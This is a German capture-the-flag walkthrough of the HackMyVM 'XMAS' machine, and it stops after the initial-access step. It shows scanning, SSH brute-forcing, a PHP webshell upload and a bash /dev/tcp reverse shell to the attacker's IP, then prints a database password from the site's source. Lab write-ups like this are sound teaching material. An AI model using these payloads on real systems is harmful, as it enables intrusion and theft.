@@ -1,0 +1,910 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XMAS - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>XMAS - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (Easy = Grün) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Tool-Liste aus dem Text extrahiert -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">dirb</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wappalyzer</div> <!-- Implizit -->
+                 <div class="tool-item">hydra</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">nc</div>
+                 <div class="tool-item">mysql</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">java</div>
+                 <div class="tool-item">msfvenom</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">mv</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (via File Upload)</a></li>
+                <li><a href="#privilege-escalation-user">Privilege Escalation (www-data zu alabaster)</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path alabaster zu root)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (alabaster zu root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.122	08:00:27:b1:ae:10	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Geräte im lokalen Netzwerk mittels ARP-Requests zu entdecken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde unter der IP-Adresse `192.168.2.122` identifiziert. Die MAC-Adresse `08:00:27:b1:ae:10` (PCS Systemtechnik GmbH) deutet auf eine VirtualBox-Umgebung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP `192.168.2.122` für weitere Scans.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung, um ARP-Scans zu erkennen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt"># <span class="command">Späterer Inhalt der /etc/hosts (implizit)</span></div>
+                     <pre>
+[...]
+192.168.2.122   xmas.hmv christmas.hmv
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um die Ziel-IP `192.168.2.122` den Hostnamen `xmas.hmv` und `christmas.hmv` zuzuordnen. Dies erleichtert den Zugriff auf eventuelle Web-Virtual-Hosts.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wichtiger vorbereitender Schritt. Der Nmap-Scan zeigt später einen Redirect zu `christmas.hmv`, was die Nützlichkeit dieses Eintrags bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `christmas.hmv` für Web-Interaktionen, da der Server dorthin umleitet.
+             <br><strong>Empfehlung (Admin):</strong> Seien Sie sich bewusst, dass Angreifer versuchen, verschiedene Hostnamen aufzulösen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p- | grep open</span></div>
+                     <pre>
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.55 ((Ubuntu)) <!-- Version korrigiert basierend auf späterem Scan -->
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein schneller `nmap`-Scan wird durchgeführt, um offene Ports und deren Versionen zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet Port 22 (SSH, OpenSSH 9.0p1) und Port 80 (HTTP, Apache 2.4.55). Dies sind die primären Angriffsflächen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Webserver (Port 80). Überprüfen Sie die SSH-Version auf bekannte Schwachstellen.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie den SSH-Zugriff. Halten Sie Dienste aktuell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.122 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-08 21:53 CEST
+Nmap scan report for xmas.hmv (192.168.2.122)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
+|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
+80/tcp open  http    Apache httpd 2.4.55 ((Ubuntu))
+|_http-title: Did not follow redirect to http://christmas.hmv
+|_http-server-header: Apache/2.4.55 (Ubuntu)
+MAC Address: 08:00:27:B1:AE:10 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms xmas.hmv (192.168.2.122)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die vollständige `nmap`-Ausgabe liefert detailliertere Informationen zu den offenen Ports und dem System.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt SSH 9.0p1 und Apache 2.4.55. Ein wichtiger Hinweis ist `Did not follow redirect to http://christmas.hmv`. Der Webserver auf Port 80 leitet Anfragen (zumindest an `xmas.hmv`) auf `christmas.hmv` um. Dies erklärt, warum dieser Hostname ebenfalls in `/etc/hosts` eingetragen wurde. Die OS-Erkennung schätzt Linux 4.15 - 5.8.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ab jetzt den Hostnamen `christmas.hmv` für alle Web-Enumerationsschritte.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Weiterleitung beabsichtigt ist. Die Konfiguration scheint den Zugriff über `christmas.hmv` zu bevorzugen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://christmas.hmv</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.122
++ Target Hostname:    christmas.hmv
++ Target Port:        80
++ Start Time:         2024-05-08 21:54:47 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.55 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods [...]
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /php/: Directory indexing found.
++ /php/: This might be interesting.
++ /images/: Directory indexing found.
++ 7962 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2024-05-08 21:54:58 (GMT2) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `nikto` wird nun korrekt gegen den Hostnamen `christmas.hmv` ausgeführt, um den Webserver zu scannen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Nikto findet:
+                <ul>
+                    <li>Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).</li>
+                    <li>Directory Indexing für `/css/`, `/php/` und `/images/`. Das `/php/`-Verzeichnis ist besonders interessant.</li>
+                </ul>
+              Die Apache-Version (2.4.55) wird hier nicht als veraltet markiert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Verzeichnisse `/css/`, `/php/`, `/images/` manuell auf interessante Dateien. Konzentrieren Sie sich auf das `/php/`-Verzeichnis und suchen Sie dort nach Skripten.
+              <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing. Implementieren Sie fehlende Sicherheitsheader.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://christmas.hmv</span></div>
+                     <pre>
+[...]
+---- Scanning URL: http://christmas.hmv/ ----
+> DIRECTORY: http://christmas.hmv/images/
+> DIRECTORY: http://christmas.hmv/css/
+> DIRECTORY: http://christmas.hmv/fonts/
++ http://christmas.hmv/index.php (CODE:200|SIZE:22834)
+> DIRECTORY: http://christmas.hmv/javascript/
+> DIRECTORY: http://christmas.hmv/js/
+> DIRECTORY: http://christmas.hmv/php/
++ http://christmas.hmv/server-status (CODE:403|SIZE:278)
+> DIRECTORY: http://christmas.hmv/uploads/
+[...]
+-----------------
+END_TIME: Wed May  8 23:03:28 2024
+DOWNLOADED: 13866 - FOUND: 3
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `dirb` wird verwendet, um gängige Verzeichnisse und Dateien auf `http://christmas.hmv` zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die von `nikto` gefundenen Verzeichnisse (`/images/`, `/css/`, `/php/`) und findet zusätzlich `/fonts/`, `/javascript/`, `/js/` sowie ein wichtiges Verzeichnis `/uploads/`. Die Datei `index.php` und der verbotene `/server-status`-Endpunkt werden ebenfalls bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `/uploads/`-Verzeichnis ist oft ein Ziel für File-Upload-Schwachstellen. Untersuchen Sie dieses Verzeichnis und `/php/` genauer.
+             <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie `/server-status` öffentlich. Stellen Sie sicher, dass das `/uploads/`-Verzeichnis korrekt konfiguriert ist (keine Ausführung von Skripten erlaubt, keine sensiblen Informationen). Sichern Sie das `/php/`-Verzeichnis.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://christmas.hmv -x [...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+[...]
+http://christmas.hmv/index.php            (Status: 200) [Size: 22834]
+http://christmas.hmv/images               (Status: 301) [Size: 315] [--> http://christmas.hmv/images/]
+http://christmas.hmv/uploads              (Status: 301) [Size: 316] [--> http://christmas.hmv/uploads/]
+http://christmas.hmv/php                  (Status: 301) [Size: 312] [--> http://christmas.hmv/php/]
+http://christmas.hmv/css                  (Status: 301) [Size: 312] [--> http://christmas.hmv/css/]
+http://christmas.hmv/js                   (Status: 301) [Size: 311] [--> http://christmas.hmv/js/]
+http://christmas.hmv/javascript           (Status: 301) [Size: 319] [--> http://christmas.hmv/javascript/]
+http://christmas.hmv/fonts                (Status: 301) [Size: 314] [--> http://christmas.hmv/fonts/]
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird mit einer anderen Wortliste und spezifischen Erweiterungen verwendet, um weitere Verzeichnisse/Dateien zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die bereits durch `dirb` gefundenen Verzeichnisse. Keine signifikanten neuen Funde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Analyse der gefundenen Verzeichnisse (`/php/`, `/uploads/`) und der `index.php`.
+             <br><strong>Empfehlung (Admin):</strong> Die Empfehlungen zur Verhinderung von Directory Enumeration bleiben bestehen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Wappalyzer Output]</div>
+                     <pre>
+Sonstiges: Popper
+Web Server: Apache HTTP Server 2.4.55
+Programmiersprache: PHP
+Betriebssysteme: Ubuntu
+JavaScript Bibliotheken: jQuery
+UI Frameworks: Bootstrap
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Wappalyzer identifiziert die auf der Webseite verwendeten Technologien.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Apache 2.4.55, PHP und Ubuntu. Identifiziert zusätzlich jQuery, Bootstrap und Popper.js als verwendete Frontend-Technologien.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Technologien. Suchen Sie nach bekannten Schwachstellen in PHP oder den spezifischen Versionen der JS-Bibliotheken/Frameworks, falls diese ermittelt werden können.
+             <br><strong>Empfehlung (Admin):</strong> Halten Sie alle Softwarekomponenten aktuell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[HTML Source Code Review]</div>
+                     <pre>
+# Auszug aus dem Quelltext von http://christmas.hmv/index.php
+
+<!-- [...] -->
+<!-- https://github.com/nhi-ngo/christmas-countdown -->
+[...]
+<!-- Erwähnte Namen (möglicherweise Kommentar oder Text) -->
+Brandy Homes
+Jesse Strange
+Kimberly Wininger
+[...]
+<a href="mailto:info@christmas.hmv">info@christmas.hmv</a>
+<a href="mailto:santa@christmas.hmv">santa@christmas.hmv</a>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der HTML-Quellcode der Hauptseite wird untersucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Mehrere interessante Funde:
+                <ul>
+                    <li>Ein GitHub-Link: `https://github.com/nhi-ngo/christmas-countdown`. Dies deutet darauf hin, dass der Code der Webseite (oder Teile davon) öffentlich verfügbar sein könnte. **Sehr wichtiger Fund!**</li>
+                    <li>Potenzielle Benutzernamen/Namen: `Brandy Homes`, `Jesse Strange`, `Kimberly Wininger`.</li>
+                    <li>E-Mail-Adressen: `info@christmas.hmv`, `santa@christmas.hmv`. Mögliche Benutzernamen (`info`, `santa`).</li>
+                </ul></p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> **Priorität:** Untersuchen Sie das GitHub-Repository `nhi-ngo/christmas-countdown` gründlich auf Quellcode, Konfigurationsdateien, hardcodierte Zugangsdaten, bekannte Schwachstellen oder Hinweise. Fügen Sie die Namen und E-Mail-Präfixe zur Liste potenzieller Benutzernamen hinzu.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Informationen wie GitHub-Links (wenn nicht beabsichtigt) oder interne Namen aus öffentlichen Quellcodes. Verwenden Sie keine leicht erratbaren Benutzernamen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Request]</div>
+                     <pre>
+# Aufruf von: view-source:http://christmas.hmv/php/form-process.php?name=ben
+# Zurückgegebener Text (Fehlermeldung):
+Name is required Email is required Subject is required Subject is required Message is required
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, direkt auf `form-process.php` im `/php/`-Verzeichnis zuzugreifen, wobei der Parameter `name` gesetzt wird. Die Antwort ist eine Fehlermeldung, die anzeigt, dass mehrere Felder erforderlich sind.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript `form-process.php` existiert und scheint Eingaben zu verarbeiten, benötigt aber spezifische POST-Parameter (`name`, `email`, `guest`, `event`, `message`). Direkter GET-Zugriff ist nicht sinnvoll. Das Anzeigen von Fehlermeldungen (`display_errors` ist vermutlich aktiv) kann für Angreifer nützlich sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von `form-process.php` im GitHub-Repository (falls vorhanden). Testen Sie das Formular auf der Webseite, das dieses Skript verwendet, auf Schwachstellen (XSS, CSRF, etc.).
+             <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie `display_errors` in Produktionsumgebungen. Validieren und sanitisieren Sie alle Formulareingaben serverseitig.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- SSH Brute-Force Versuche (vermutlich erfolglos) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l alabaster -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.122:22 -t 64</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l joseph -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.122:22 -t 64</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l nhi-ngo -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.122:22 -t 64</span></div>
+                     <!-- Kein Output -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um SSH-Passwörter für die Benutzernamen `alabaster` (unbekannte Herkunft, evtl. CTF-Autor?), `joseph` (aus der Webseite?) und `nhi-ngo` (aus dem GitHub-Link) mit der `rockyou.txt`-Liste zu bruteforcen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Da keine Erfolgsmeldungen angezeigt werden, waren diese Brute-Force-Versuche wahrscheinlich erfolglos oder wurden abgebrochen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SSH-Bruteforce ist hier anscheinend nicht der Weg. Konzentrieren Sie sich auf die Webanwendung und die Informationen aus dem GitHub-Repository.
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie `fail2ban`, starke Passwörter und Key-basierte Authentifizierung für SSH.</p>
+
+             <!-- Hinweis auf GitHub -->
+             <p class="analysis"><strong>Analyse:</strong> Erneuter Hinweis auf das GitHub-Repository `https://github.com/nhi-ngo/christmas-countdown`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Untersuchung dieses Repositorys ist entscheidend, da es wahrscheinlich den Quellcode der Webanwendung enthält.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Klonen und analysieren Sie das Repository.
+             <br><strong>Empfehlung (Admin):</strong> Seien Sie sich bewusst, dass öffentlich verfügbarer Code von Angreifern analysiert wird.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://christmas.hmv" -H "Host: FUZZ.christmas.hmv" --hc "404" --hw 28</span></div>
+                     <pre>
+[...]
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   200        591 L    1734 W     22820 Ch    "www"
+
+Total time: 68.55460
+Processed Requests: 114441
+Filtered Requests: 114436
+Requests/sec.: 1669.340
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Subdomain-Enumeration mittels Virtual Host Fuzzing für die Domain `christmas.hmv`. Es wird nach Subdomains gesucht, die einen anderen Inhalt als die Hauptseite liefern (Filterung nach Chars = 28 war vermutlich falsch gewählt, da `www` eine andere Größe hat).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet die Subdomain `www`. Vergleich der Antwortgröße (22820 Chars) mit `index.php` auf der Hauptdomain (22834 Chars) zeigt einen minimalen Unterschied, wahrscheinlich aber denselben Inhalt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Subdomain `www` scheint keine neue Angriffsfläche zu bieten.
+            <br><strong>Empfehlung (Admin):</strong> DNS- und VHost-Konfiguration überprüfen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl www.christmas.hmv -vI</span></div>
+                      <pre>
+* Host www.christmas.hmv:80 was resolved. [...]
+* Connected to www.christmas.hmv (192.168.2.122) port 80
+> HEAD / HTTP/1.1
+> Host: www.christmas.hmv
+> User-Agent: curl/8.5.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Wed, 08 May 2024 21:35:55 GMT
+< Server: Apache/2.4.55 (Ubuntu)
+< Content-Type: text/html; charset=UTF-8
+<
+* Connection #0 to host www.christmas.hmv left intact
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Eine HEAD-Anfrage mit `curl -vI` wird an `www.christmas.hmv` gesendet.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `www.christmas.hmv` erreichbar ist und mit `200 OK` antwortet. Keine neuen Informationen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentration auf Schwachstellen in der Anwendung selbst.
+              <br><strong>Empfehlung (Admin):</strong> Standard-Webserver-Verhalten.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via File Upload)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual File Upload Request (Burp/Proxy)]</div>
+                     <pre>
+POST / HTTP/1.1
+Host: www.christmas.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------3773613376401723222531236745
+Content-Length: 379
+Origin: http://www.christmas.hmv
+Connection: close
+Referer: http://www.christmas.hmv/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------3773613376401723222531236745
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+
+-----------------------------3773613376401723222531236745
+Content-Disposition: form-data; name="submit"
+
+Upload File
+-----------------------------3773613376401723222531236745--
+                     </pre>
+                      <!-- Server Response -->
+                      <pre>
+HTTP/1.1 200 OK
+Date: Wed, 08 May 2024 21:40:33 GMT
+Server: Apache/2.4.55 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 23240
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+[...]
+File uploaded successfully.
+[...]
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein POST-Request wird an die Root-URL (`/`) von `www.christmas.hmv` gesendet. Der Request enthält `multipart/form-data`, was auf einen Dateiupload hindeutet. Eine Datei namens `shell.php` mit dem Inhalt `<?php system($_GET['cmd']); ?>` (eine einfache PHP-Webshell) wird hochgeladen. Der Server antwortet mit `200 OK` und der Meldung "File uploaded successfully.".</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritische Schwachstelle: Arbitrary File Upload!** Die Webanwendung erlaubt das Hochladen von Dateien ohne ausreichende Validierung des Dateityps oder Inhalts. Eine PHP-Webshell konnte erfolgreich hochgeladen werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestimmen Sie den Speicherort der hochgeladenen Datei (vermutlich im zuvor gefundenen `/uploads/`-Verzeichnis). Testen Sie die Webshell, indem Sie eine URL wie `http://christmas.hmv/uploads/shell.php?cmd=id` aufrufen. Nutzen Sie die Webshell, um eine Reverse Shell zu erhalten.
+             <br><strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Beheben Sie die File-Upload-Schwachstelle sofort. Implementieren Sie strikte Überprüfungen für Dateitypen (Whitelist), Dateinamen und Inhalte. Speichern Sie Uploads idealerweise außerhalb des Web-Roots und mit zufälligen Namen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Webshell Test]</div>
+                     <pre>
+# Aufruf: http://christmas.hmv/uploads/shell.php?cmd=ls
+# Ausgabe (im Browser oder Quelltext):
+shell.php
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die hochgeladene Webshell wird getestet, indem der `ls`-Befehl über den `cmd`-Parameter ausgeführt wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Webshell funktioniert. Der `ls`-Befehl wird ausgeführt und listet die Webshell-Datei selbst im `/uploads/`-Verzeichnis auf. Dies bestätigt die Möglichkeit zur Remote Code Execution (RCE) als Webserver-Benutzer (`www-data`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die Webshell, um eine Reverse Shell zu starten.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell (`/uploads/shell.php`) und beheben Sie die Upload-Schwachstelle.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Listener starten -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                      <pre>listening on [any] 4444 ...</pre>
+                      <!-- Reverse Shell über Webshell auslösen -->
+                       <div class="prompt">[Browser/Curl Request]</div>
+                      <pre>
+# URL aufgerufen (URL-Encoded):
+http://christmas.hmv/uploads/shell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27
+# Decoded Command: /bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'
+                      </pre>
+                       <!-- Eingehende Verbindung -->
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                       <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.122] 48396
+bash: cannot set terminal process group (716): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@xmas:/var/www/christmas.hmv/uploads$
+                       </pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 4444 gestartet. Über die Webshell wird ein Bash-Befehl ausgeführt, der eine interaktive Reverse Shell zur IP des Angreifers (`192.168.2.199`) auf Port 4444 aufbaut.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> **Initial Access erfolgreich!** Die Reverse Shell wird erfolgreich empfangen. Der Angreifer hat nun eine Shell auf dem Zielsystem als Benutzer `www-data`. Der Hostname ist `xmas`.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Führen Sie lokale Enumeration als `www-data` durch. Suchen Sie nach Konfigurationsdateien, Passwörtern oder Wegen zur Rechteerweiterung.
+               <br><strong>Empfehlung (Admin):</strong> Beheben Sie die File-Upload-Schwachstelle. Überwachen Sie ausgehende Verbindungen.</p>
+        </section>
+
+        <section id="privilege-escalation-user">
+            <h2>Privilege Escalation (www-data zu alabaster)</h2>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">www-data@xmas:/var/www/christmas.hmv$ <span class="command">cat index.php</span></div>
+                      <pre>
+[...]
+// Connect to your database
+$mysqli = new mysqli('localhost', 'root', '<span class="password">ChristmasMustGon!</span>', 'christmas');
+
+// Check the connection
+[...]
+                      </pre>
+                  </div>
+              </div>
